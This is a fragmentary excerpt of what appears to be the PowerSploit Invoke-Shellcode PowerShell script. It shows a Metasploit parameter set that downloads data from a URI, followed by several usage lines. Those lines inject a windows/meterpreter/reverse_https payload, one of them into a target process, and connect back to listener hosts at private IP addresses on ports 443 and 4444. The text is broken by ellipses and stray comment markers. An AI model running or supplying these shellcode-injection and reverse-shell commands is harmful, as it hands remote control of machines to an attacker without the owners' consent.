...
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    ...
    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
    {
        ...
        try
        {
            Write-Verbose "download data: $WebClient.DownloadData($Uri)"
...
Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.42.129 -Lport 443 -Verbose 
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.42.129 -Lport 443 -Verbose
"pown"#>
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.12 -Lport 4444 -Verbose -Force
